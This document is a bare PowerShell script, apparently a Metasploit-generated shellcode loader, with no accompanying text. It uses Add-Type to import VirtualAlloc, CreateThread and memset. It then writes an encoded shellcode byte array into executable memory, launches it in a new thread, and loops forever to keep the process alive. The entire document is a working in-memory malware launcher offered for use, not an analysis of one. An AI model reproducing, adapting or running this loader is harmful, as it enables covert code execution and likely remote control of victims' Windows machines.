
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xa7,0xa5,0x52,0xc0,0xd9,0xe5,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x77,0x0f,0x03,0x77,0xa8,0x47,0xa7,0x3c,0x5e,0x05,0x48,0xbd,0x9e,0x6a,0xc0,0x58,0xaf,0xaa,0xb6,0x29,0x9f,0x1a,0xbc,0x7c,0x13,0xd0,0x90,0x94,0xa0,0x94,0x3c,0x9a,0x01,0x12,0x1b,0x95,0x92,0x0f,0x5f,0xb4,0x10,0x52,0x8c,0x16,0x29,0x9d,0xc1,0x57,0x6e,0xc0,0x28,0x05,0x27,0x8e,0x9f,0xba,0x4c,0xda,0x23,0x30,0x1e,0xca,0x23,0xa5,0xd6,0xed,0x02,0x78,0x6d,0xb4,0x84,0x7a,0xa2,0xcc,0x8c,0x64,0xa7,0xe9,0x47,0x1e,0x13,0x85,0x59,0xf6,0x6a,0x66,0xf5,0x37,0x43,0x95,0x07,0x7f,0x63,0x46,0x72,0x89,0x90,0xfb,0x85,0x4e,0xeb,0x27,0x03,0x55,0x4b,0xa3,0xb3,0xb1,0x6a,0x60,0x25,0x31,0x60,0xcd,0x21,0x1d,0x64,0xd0,0xe6,0x15,0x90,0x59,0x09,0xfa,0x11,0x19,0x2e,0xde,0x7a,0xf9,0x4f,0x47,0x26,0xac,0x70,0x97,0x89,0x11,0xd5,0xd3,0x27,0x45,0x64,0xbe,0x2f,0xaa,0x45,0x41,0xaf,0xa4,0xde,0x32,0x9d,0x6b,0x75,0xdd,0xad,0xe4,0x53,0x1a,0xd2,0xde,0x24,0xb4,0x2d,0xe1,0x54,0x9c,0xe9,0xb5,0x04,0xb6,0xd8,0xb5,0xce,0x46,0xe5,0x63,0x40,0x17,0x49,0xdc,0x21,0xc7,0x29,0x8c,0xc9,0x0d,0xa6,0xf3,0xea,0x2d,0x6d,0x9c,0x81,0xd4,0xe5,0xec,0x39,0x21,0xda,0x9a,0xc3,0xcd,0x35,0x07,0x4d,0x2b,0x5f,0xa7,0x1b,0xe3,0xf7,0x5e,0x06,0x7f,0x66,0x9e,0x9c,0x05,0xa8,0x14,0x13,0xf9,0x66,0xdd,0x5e,0xe9,0x1e,0x2d,0x15,0x53,0x88,0x32,0x83,0xfe,0x34,0xa7,0x28,0xa9,0x63,0x5f,0x33,0x8c,0x43,0xc0,0xcc,0xfb,0xd8,0xc9,0x58,0x44,0xb6,0x35,0x8d,0x44,0x46,0x60,0xc7,0x44,0x2e,0xd4,0xb3,0x16,0x4b,0x1b,0x6e,0x0b,0xc0,0x8e,0x91,0x7a,0xb5,0x19,0xfa,0x80,0xe0,0x6e,0xa5,0x7b,0xc7,0x6e,0x99,0xad,0x21,0x05,0xf3,0x6d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

